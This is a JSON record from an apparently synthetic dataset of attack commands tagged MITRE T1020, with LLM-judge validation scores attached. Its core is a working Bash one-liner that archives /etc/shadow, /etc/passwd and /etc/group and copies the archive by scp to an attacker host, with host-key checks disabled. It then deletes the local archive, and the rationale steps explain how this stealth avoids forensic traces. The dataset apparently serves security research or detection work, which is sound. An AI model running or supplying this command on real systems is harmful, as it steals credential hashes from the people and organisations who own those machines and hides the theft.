{
  "technique_id": "T1020",
  "platform": "Linux",
  "shell": "Bash",
  "command": "ts=$(date +%s); tar -czf /tmp/syscreds_${ts}.tgz /etc/shadow /etc/passwd /etc/group >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/syscreds_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/ >/dev/null 2>&1 && rm -f /tmp/syscreds_${ts}.tgz",
  "explanation": "Packages sensitive account files and exfiltrates them via scp using non-interactive key auth over SSH on port 443, running quietly and removing artifacts to remain stealthy.",
  "rationale_steps": [
    "Create a timestamped tarball of /etc/shadow, /etc/passwd, and /etc/group to aggregate targets and reduce transfer size.",
    "Use scp with -q and -C for quiet, compressed transfer and -i for key-based, non-interactive auth.",
    "Bypass host key prompts with StrictHostKeyChecking=no and suppress host entry with UserKnownHostsFile=/dev/null.",
    "Send to a hidden path on the remote host and delete the local archive to reduce forensic traces."
  ],
  "obfuscation_level": "none",
  "id": "SYN-BASH-T1020-e93662d8-2dd6b351",
  "source_prompt_hash": "e93662d8",
  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The command is well-formed Bash with valid flags, proper separators, variable expansion, and standard redirections.",
        "semantic_score": 3,
        "semantic_justification": "While it aligns with T1020 by bundling data and exfiltrating via scp with stealth and cleanup, it would typically fail without root to read /etc/shadow and to use /root/.ssh/id_rsa, contradicting the stated 'Privilege: None'.",
        "combined_score": 4.0,
        "confidence": 0.9,
        "timestamp": "2025-10-01T05:07:39.499438Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags, appropriate command separators (&&), and correct redirection operators.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements automated exfiltration by collecting sensitive credential files (/etc/shadow, /etc/passwd, /etc/group), compressing them with a timestamp, transferring them via SCP over port 443 to an external server, and removing the local evidence afterward.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T05:07:42.572838Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, uses correct bash syntax for variable assignment, command chaining with `&&`, file redirection, and valid flags for `tar`, `scp`, and `rm`.",
        "semantic_score": 2,
        "semantic_justification": "The command fails to achieve its primary intent of packaging sensitive files like /etc/shadow because it requires root privileges, which directly contradicts the stated 'Privilege: None' context, rendering the initial `tar` command inoperable.",
        "combined_score": 3.5,
        "confidence": 1.0,
        "timestamp": "2025-10-01T05:08:05.720765Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.333,
    "llm_average_score": 4.167,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
